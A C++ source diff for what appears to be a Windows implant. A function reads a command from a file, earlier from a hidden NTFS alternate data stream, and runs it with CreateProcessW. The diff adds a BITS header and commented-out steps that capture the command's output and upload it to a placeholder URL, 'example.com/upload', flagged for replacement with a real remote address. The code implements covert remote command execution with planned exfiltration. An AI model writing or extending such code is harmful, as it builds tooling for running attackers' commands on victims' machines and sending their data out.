@@ -1,4 +1,5 @@
 #include "file_operations.h"
+#include "bits_operations.h"
 #include <iostream>
 #include <string>
 #include <random>
@@ -43,7 +44,8 @@ std::wstring readCommentFromFile(const std::wstring& filePath) {
 }
 
 void ExecuteCommandFromFile(const std::wstring& localFile) {
-    std::wstring command = readCommentFromFile(localFile);  // Read the command from the ADS
+    std::wstring command = readCommentFromFile(localFile);  // Read the command from file
+    std::wstring outputFile = L"output.txt";
     
 
     if (!command.empty()) {
@@ -54,6 +56,9 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
             STARTUPINFO si = { 0 };
             PROCESS_INFORMATION pi = { 0 };
             si.cb = sizeof(si);
+
+            // Modify the command to redirect both stdout and stderr to output.txt
+            /*command.append(L" > ").append(outputFile).append(L" 2>&1");*/
 
             // Create the process
             BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
@@ -67,10 +72,12 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
                 // Close handles
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
+
+                // After the command finishes, upload the output file
+               /* UploadFile(outputFile, L"http://example.com/upload"); */ // Replace with the actual remote URL
+
+                tempCommand = command;
             }
-        }
-        else {
-            tempCommand = command;
         }
     }
     else {
